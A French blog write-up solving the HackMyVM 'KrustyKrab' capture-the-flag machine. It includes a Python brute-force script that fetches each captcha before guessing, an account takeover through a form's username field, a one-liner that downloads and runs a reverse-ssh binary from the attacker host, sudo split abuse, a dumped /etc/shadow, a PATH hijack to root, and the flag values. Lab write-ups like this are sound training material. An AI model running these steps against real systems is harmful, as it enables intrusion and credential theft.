---
title: "Solution du CTF KrustyKrab de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### HandyGrub

`KrustyKrab` est une image virtuelle d'un système pénétrable, aka un CTF, téléchargeable sur [HackMyVM](https://hackmyvm.eu/).

La VM a posé quelques problèmes puisqu'elle ne disposait pas de connexion réseau au démarrage.

Il a fallu éditer l'entrée GRUB en tapant la touche `e` au démarrage puis éditer la ligne de l'init (généralement celle où on lit `ro quiet`).

On remplace cette fin de ligne par `rw init=/bin/sh`, on sauve et on obtient alors un shell root sur le système.

Initialement, j'avais ajouté un utilisateur dans `/etc/passwd` mais il semble que la modification était écrasée au lancement normal du système.

Par conséquent, j'ai shunté ça en ajoutant un script `/etc/rc.local` qui se charge d'ajouter la ligne dans `/etc/passwd`

Au reboot normal, je me connecte avec le nouvel utilisateur et j'exécute `dhclient` pour forcer l'obtention de l'adresse IP.

Je peux ensuite commencer l'exploitation en boîte noire.

### JumpyJack

Pour ce qui est des ports, c'est du très classique :

```console
$ sudo nmap -sCV -p- -T5 192.168.242.129
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.129
Host is up (0.00064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 f6:91:6b:ad:ea:ad:1d:b9:44:09:d8:74:a3:02:38:35 (ECDSA)
|_  256 b6:66:2f:f0:4c:26:7f:7d:14:ea:b3:62:09:64:a7:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:4A:5F:05 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds
```

La page d'index du site est tout aussi basique et une énumération des dossiers et fichiers n'a rien remonté d'intéressant.

En regardant le code source de la page d'accueil, on remarque qu'il y a un commentaire mentionnant le chemin `finexo`.

```html
          <p>
                This is the default welcome page used to test the correct 
                operation of the Apache2 server after installation on Ubuntu systems.
                It is based on the equivalent page on Debian, from which the Ubuntu Apache
                packaging is derived.
                If you can read this page, it means that the Apache HTTP server installed at
                this site is working properly. You should <b>replace this file</b> (located at
                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
          </p>
        <!--/var/www/html/finexo -->
```

Cette fois, on est sur la bonne voie.

```console
$ wapiti -u http://192.168.242.129/finexo/ -v2 --color -m ""

     __    __            _ _   _ _____
    / / /\ \ \__ _ _ __ (_) |_(_)___ /
    \ \/  \/ / _` | '_ \| | __| | |_ \
     \  /\  / (_| | |_) | | |_| |___) |
      \/  \/ \__,_| .__/|_|\__|_|____/
                  |_|                 
Wapiti 3.2.4 (wapiti-scanner.github.io)
[+] GET http://192.168.242.129/finexo/ (0)
[+] GET http://192.168.242.129/finexo/index.html (1)
[+] GET http://192.168.242.129/finexo/about.html (1)
[+] GET http://192.168.242.129/finexo/service.html (1)
[+] GET http://192.168.242.129/finexo/why.html (1)
[+] GET http://192.168.242.129/finexo/js/custom.js (1)
[+] GET http://192.168.242.129/finexo/team.html (1)
[+] GET http://192.168.242.129/finexo/login.php (1)
[+] GET http://192.168.242.129/finexo/js/jquery-3.4.1.min.js (1)
[+] GET http://192.168.242.129/finexo/js/bootstrap.js (1)
[+] POST http://192.168.242.129/finexo/login.php (2)
        data: username=alice&password=Letm3in_&captcha=default
[+] GET http://192.168.242.129/finexo/particles.js-master/dist/particles.min.js (2)
```

La page de login est derrière un captcha. En jouant avec, on remarque que les messages d'erreurs sont explicites.

Ainsi pour le compte `admin` et un mot de passe bidon, on obtient `User doesn't exit`.

Sur la page "team" on trouve quelques noms que voici :

```
SpongeBob
PatrickStar
Squidward
Sandy
```

Presque tous les utilisateurs n'existent pas à l'exception de  `SpongeBob` pour lequel on obtient `Wrong Password`.

L'implémentation du captcha est triviale : sa valeur est récupérée via une requête XHR, directement au format texte.

Pour notre script de brute-force, il faut donc faire à chaque fois une requête préalable pour l'obtenir :

```python
import sys

import requests
from requests.exceptions import RequestException

sess = requests.session()
URL = "http://192.168.242.129/finexo/login.php"

def test_password(password: str) -> bool:
    global session

    try:
        captcha = sess.get(URL + "?action=generateCaptcha").text
        response = sess.post(URL, data={"username": "SpongeBob", "password": password, "captcha": captcha})
        if "Wrong Captcha" in response.text:
            print("Got a bad captcha!")
            return False
        if "Wrong Password" in response.text:
            return False
    except RequestException as err:
        print(f"Bad response: {err}")
        return False

    return True


if __name__ == "__main__":
    with open(sys.argv[1], encoding="utf-8", errors="ignore") as fd:
        for line in fd:
            passwd = line.strip()
            if test_password(passwd):
                print(f"Found password {passwd}")
                break
```

On obtient assez rapidement le mot de passe :

```
Found password squarepants
```

### LumpyShack

Une fois connecté, on tombe sur un dashboard évolué avec un logo sous-titré `Mantis`.

J'ai fait une rechercher par image sur Google et je suis tombé sur ce post [Instagram](https://www.instagram.com/codedthemes/reel/DBYdJKIvqtr/).

Il s'agit juste d'un panel par un site de webdesign, le backend est à la charge de l'utilisateur.

Sans trop de surprise la majorité des liens sur le dashboard ne mènent nulle part. Il y a tout de même une section "Edit profile" avec ce formulaire :

```html
<form id="editProfileForm" enctype="multipart/form-data">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" value="SpongeBob" disabled="">

      <label for="email">Mail:</label>
      <input type="email" id="email" name="email">

      <label for="profile_picture">Avatar</label>
      <input type="file" id="profile_picture" name="profile_picture" accept="image/*">

      <label for="password">New Password (Optional):</label>
      <input type="password" id="password" name="password">

      <div class="form-buttons">
        <button type="submit" class="submit-btn">Save</button>
        <button type="button" class="close-btn" onclick="document.getElementById('editProfileDialog').close();">Cancel</button>
      </div>
    </form>
```

Ça ne m'a pas sauté aux yeux initialement, mais le username fait partie des champs du formulaire. Bien sûr dans le HTML il est `disabled` mais à partir du moment où le champ à un attribut `name` alors c'est envoyé.

Dès lors, on peut supposer qu'on peut changer le compte de n'importe quel utilisateur en modifiant ce champ (via les devtools du navigateur).

Il y a une autre section `Send message` et on trouve quelques noms :

```
Cristina danny
Aida Burg
Administratro
```

Seul le dernier compte est valide, on peut vérifier son existence avec les messages d'erreurs de la page de login.

Une fois le mot de passe changé et la connexion effectuée, je remarque que cet utilisateur dispose d'une entrée "Command prompt" dans son dashboard. Je saisis `id` et j'obtiens :

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Je passe ensuite à un shell évolué via `reverse-ssh` :

```bash
cd /tmp;wget http://192.168.242.1:8000/reverse-sshx64;chmod 755 reverse-sshx64;nohup reverse-sshx64&
```

Dans un fichier de configuration PHP je trouve un mot de passe :

```php
$servername = "localhost";
$username = "root";
$password = "RootRootandRootyou";
$dbname = "your_database";
$port = 3306;
```

Mais il ne semble pas réutilisé ailleurs. J'ai fouillé longuement, mais en dehors des dossiers personnels je n'ai pas trouvé de fichiers intéressants :

```console
www-data@KrustyKrab:/home$ ls -al
total 36
drwxr-xr-x  6 root       root       4096 Mar 27 02:30 .
drwxr-xr-x 19 root       root       4096 Jul 11  2023 ..
drwx------  3 KrustyKrab debian     4096 Mar 30 00:15 KrustyKrab
drwx------  3 Squidward  Squidward  4096 Mar 30 00:19 Squidward
drwx------  2 root       root      16384 Jul 11  2023 lost+found
drwx------  3 spongebob  spongebob  4096 Mar 30 00:15 spongebob
```

Je m'en suis remis à LinPEAS et j'ai découvert que `www-data` avait une entrée dans sudoers :

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for www-data on KrustyKrab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on KrustyKrab:
    (KrustyKrab) NOPASSWD: /usr/bin/split
```

La commande `split` est bien connue pour découper des fichiers, mais moins pour exécuter des commandes.

J'ai d'abord tenté de faire un `split` sur la clé SSH de l'utilisateur, mais il n'en avait pas.

Il s'est avéré qu'il y a bien une exécution de commande possible :

```
--filter=COMMAND    write to shell COMMAND; file name is $FILE
```

J'ai réutilisé l'exemple de [GTFOBins](https://gtfobins.github.io/gtfobins/split/) :

```console
www-data@KrustyKrab:/tmp$ sudo -u KrustyKrab /usr/bin/split --filter=/bin/sh /dev/stdin
id
uid=1000(KrustyKrab) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth),1002(krustygroup)
cd /home/KrustyKrab
mkdir .ssh
cd .ssh                                                           
wget http://192.168.242.1:8000/key_no_pass.pub -O authorized_keys
--2025-05-06 20:59:03--  http://192.168.242.1:8000/key_no_pass.pub
Connecting to 192.168.242.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 399 [application/x-mspublisher]
Saving to: 'authorized_keys'

authorized_keys       100%[=================================>]     399  --.-KB/s    in 0s      

2025-05-06 20:59:03 (19.5 MB/s) - 'authorized_keys' saved [399/399]
```

Avec ce compte, on obtient le premier flag :

```
KrustyKrab@KrustyKrab:~$ ls -al
total 2896
drwx------ 4 KrustyKrab debian    4096 May  6 20:58 .
drwxr-xr-x 6 root       root      4096 Mar 27 02:30 ..
lrwxrwxrwx 1 KrustyKrab debian       9 Mar 30 00:15 .bash_history -> /dev/null
-rw-r--r-- 1 KrustyKrab debian     220 Jul 11  2023 .bash_logout
-rw-r--r-- 1 KrustyKrab debian    3553 Mar 30 00:03 .bashrc
-rw-r--r-- 1 root       root   2925104 Mar 26 23:39 help
drwxr-xr-x 3 KrustyKrab debian    4096 Mar 24 06:36 .local
-rw------- 1 KrustyKrab debian     172 Mar 29 23:39 .mysql_history
-rw-r--r-- 1 KrustyKrab debian     807 Jul 11  2023 .profile
drwxr-xr-x 2 KrustyKrab debian    4096 May  6 20:59 .ssh
-rw-r--r-- 1 KrustyKrab debian       0 Mar 27 05:14 .sudo_as_admin_successful
-rw-r--r-- 1 root       root        33 Mar 27 03:04 user.txt
KrustyKrab@KrustyKrab:~$ cat user.txt 
dcc8b0c111c9fa1522c7abfac8d1864b
```

### GrumpyCat

Et c'est reparti pour du `sudo` :

```
KrustyKrab@KrustyKrab:~$ sudo -l
Matching Defaults entries for KrustyKrab on KrustyKrab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User KrustyKrab may run the following commands on KrustyKrab:
    (spongebob) NOPASSWD: /usr/bin/ttteeesssttt
```

D'après `strings` ce binaire peut donner un shell si on donne ce qu'il attend, c'est-à-dire le bon ordre des ingrédients pour le Krabby Patty. 

```console
KrustyKrab@KrustyKrab:~$ strings /usr/bin/ttteeesssttt
/lib64/ld-linux-x86-64.so.2
puts
system
time
strlen
getchar
__libc_start_main
srand
__cxa_finalize
printf
__isoc99_scanf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
<J~
Bottom bun
Patty
Lettuce
Cheese
Onion
Tomato
Ketchup
Mustard
Pickles
Top bun
ABCDEFGHIJ
Spongebob forgot how to make Krabby Patty, You need to help him!
Current shuffled recipe order:
%c: %s
Please enter the correct order using letters (e.g., ABCDEFGHIJ):
Enter 10 letters (A-J): 
%10s
Error: You must enter exactly 10 letters!
Error: Contains invalid characters! Use only A-J.
Validation successful! Perfect Krabby Patty!
Validation failed! This is not the correct recipe!
/bin/bash -p
--- snip ---
```

On peut trouver ce genre d'images sur Internet :

![Krabby Patty](/assets/img/hackmyvm/krustykrab.jpg)

On remet les ingrédients dans l'ordre en partant du bas :

```console
KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt 

Spongebob forgot how to make Krabby Patty, You need to help him!

Current shuffled recipe order:
A: Ketchup
B: Onion
C: Mustard
D: Top bun
E: Tomato
F: Patty
G: Bottom bun
H: Pickles
I: Lettuce
J: Cheese

Please enter the correct order using letters (e.g., ABCDEFGHIJ):
Enter 10 letters (A-J): GFIJBEACHD

Validation successful! Perfect Krabby Patty!
spongebob@KrustyKrab:/home/KrustyKrab$ id
uid=1001(spongebob) gid=1001(spongebob) groups=1001(spongebob),100(users),1002(krustygroup)
spongebob@KrustyKrab:/home/KrustyKrab$ cd
spongebob@KrustyKrab:~$ ls -alh
total 56K
drwx------ 3 spongebob spongebob 4.0K Mar 30 00:15 .
drwxr-xr-x 6 root      root      4.0K Mar 27 02:30 ..
lrwxrwxrwx 1 spongebob spongebob    9 Mar 30 00:15 .bash_history -> /dev/null
-rw-r--r-- 1 spongebob spongebob  220 Mar 26 20:14 .bash_logout
-rw-r--r-- 1 spongebob spongebob 3.5K Mar 30 00:09 .bashrc
-rw-r--r-- 1 root      root        33 Mar 27 02:37 key1
-rw-r--r-- 1 root      root       19K Mar 27 02:32 key2.jpeg
drwxr-xr-x 3 spongebob spongebob 4.0K Mar 30 00:09 .local
-rw------- 1 spongebob spongebob  113 Mar 27 05:16 .mysql_history
-rw-r--r-- 1 root      root        97 Mar 27 02:41 note.txt
-rw-r--r-- 1 spongebob spongebob  807 Mar 26 20:14 .profile
```

On aurait bien sûr pu faire du reverse ou de l'instrumentation de binaire.

Passer à l'utilisateur Squidward ne devrait pas être trop compliqué :

```console
spongebob@KrustyKrab:~$ cat note.txt

Squidward is waiting for you!!!!

password is md5($key1$key2).

It's not so hard as you think.
```

J'ai fait 2 ou 3 tentatives infructueuses comme celle-ci :

```console
spongebob@KrustyKrab:~$ cat key1 > yolo
spongebob@KrustyKrab:~$ cat key2.jpeg >> yolo
spongebob@KrustyKrab:~$ md5sum yolo
05d41033cf6a73cdddc7b3954017cb1f  yolo
spongebob@KrustyKrab:~$ su Squidward 
Password: 
su: Authentication failure
```

Finalement celle-là était la bonne :

```console
spongebob@KrustyKrab:~$ cat key1 
e1964798cfe86e914af895f8d0291812
spongebob@KrustyKrab:~$ md5sum key2.jpeg 
5e1d0c1a168dc2d70004c2b00ba314ae  key2.jpeg
spongebob@KrustyKrab:~$ echo -n e1964798cfe86e914af895f8d02918125e1d0c1a168dc2d70004c2b00ba314ae | md5sum
7ac254848d6e4556b73398dde2e4ef82  -
spongebob@KrustyKrab:~$ su Squidward 
Password: 
$ id
uid=1002(Squidward) gid=1003(Squidward) groups=1003(Squidward)
$ bash
Squidward@KrustyKrab:/home/spongebob$ cd
Squidward@KrustyKrab:~$ ls -al
total 40
drwx------ 3 Squidward Squidward  4096 Mar 30 00:19 .
drwxr-xr-x 6 root      root       4096 Mar 27 02:30 ..
lrwxrwxrwx 1 Squidward Squidward     9 Mar 30 00:19 .bash_history -> /dev/null
-rw-r--r-- 1 Squidward Squidward   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 Squidward Squidward  3526 Apr 23  2023 .bashrc
-rwsr-xr-x 1 root      root      16056 Mar 27 05:12 laststep
drwxr-xr-x 3 Squidward Squidward  4096 Mar 27 08:17 .local
-rw-r--r-- 1 Squidward Squidward   807 Apr 23  2023 .profile
```



### FakyCat

Pour le dernier binaire, on devine qu'il fait un setuid/setgid puis exécute `cat /etc/shadow` :

```console
Squidward@KrustyKrab:~$ strings laststep
/lib64/ld-linux-x86-64.so.2
setgid
setuid
system
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
cat /etc/shadow
;*3$"
GCC: (Debian 12.2.0-14) 12.2.0
--- snip ---
```

Bingo :

```console
Squidward@KrustyKrab:~$ ./laststep 
root:$y$j9T$xm9zjJdLydmP9yMp9Nj3C0$RK1zpq.FysZjb30c5IUWzUi.BWYvIUsygxhgsyvyzO3:20174:0:99999:7:::
daemon:*:19549:0:99999:7:::
bin:*:19549:0:99999:7:::
sys:*:19549:0:99999:7:::
sync:*:19549:0:99999:7:::
games:*:19549:0:99999:7:::
man:*:19549:0:99999:7:::
lp:*:19549:0:99999:7:::
mail:*:19549:0:99999:7:::
news:*:19549:0:99999:7:::
uucp:*:19549:0:99999:7:::
proxy:*:19549:0:99999:7:::
www-data:*:19549:0:99999:7:::
backup:*:19549:0:99999:7:::
list:*:19549:0:99999:7:::
irc:*:19549:0:99999:7:::
_apt:*:19549:0:99999:7:::
nobody:*:19549:0:99999:7:::
systemd-network:!*:19549::::::
systemd-timesync:!*:19549::::::
messagebus:!:19549::::::
avahi-autoipd:!:19549::::::
sshd:!:19549::::::
mysql:!:20171::::::
KrustyKrab:$y$j9T$v3iavPLpYl5ezsR4pMSjc0$bPxk2s3wxGrhgv4PpFbYVP9sy4ERDnAzf14Ud.p1Iq4:20174:0:99999:7:::
spongebob:$y$j9T$QMeIdDraDWE0L5C65y6SN1$JqifleH2vWxsHdW.1eZHTLEhqluSDP7RKOPhKdpGip8:20174:0:99999:7:::
Squidward:$y$j9T$G4aYhd9T1rT4dzeu06RZZ1$mbjej1b0wgbrF.KlZrP6WafH5tI9ssL8ztqEDDC2tD7:20174:0:99999:7:::
Debian-exim:!:20174::::::
```

On est sur un cas d'école d'exploitation du PATH :

```console
Squidward@KrustyKrab:~$ echo -e '#!/usr/bin/bash\nmkdir -p /root/.ssh\ncp /tmp/authorized_keys /root/.ssh/' > cat
Squidward@KrustyKrab:~$ chmod 755 cat
Squidward@KrustyKrab:~$ PATH=.:$PATH ./laststep
```

Gigateuf !

```console
$ ssh -i key_no_pass root@192.168.242.129
root@KrustyKrab:~# id
uid=0(root) gid=0(root) groups=0(root)
root@KrustyKrab:~# ls
root.txt
root@KrustyKrab:~# cat root.txt 
efe397e3897f0c19ef0150c2b69046a3
```
